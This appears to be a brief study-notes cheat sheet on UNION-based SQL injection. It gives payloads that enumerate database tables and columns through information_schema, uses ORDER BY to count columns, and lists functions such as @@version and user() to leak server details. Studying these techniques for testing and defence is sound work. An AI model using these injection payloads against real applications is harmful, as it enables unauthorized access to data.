## Basics Not Mentioned In Essentials
### Union
`SELECT * FROM [table] WHERE [CONDITION] UNION SELECT 1,2,3,4,5,6`\
This creates a new element where the values are *1,2,3,4,5,6*. If there is information echoed back, might be a good idea to insert the below code.

Given the second element is the one that is echoed back, the following command could be used to get more info.\
`UNION SELECT 1,table_name,3,4 FROM information_schema.tables`\
`UNION SELECT 1,column_name,3,4 FROM information_schema.columns`

You can get the columns of specific tables from with the following.\
`UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE TABLE_NAME = '[table name]'`


In normal circumstancecs the following could be used.\
`SELECT table_name FROM information_schema.tables`\
`SELECT column_name FROM information_schema.columns`

**As a side note**, `ORDER BY [NUMBER]` can be used to get the number of columns.

### Information to echo back:\
`@@version`, `user()`, `database()`
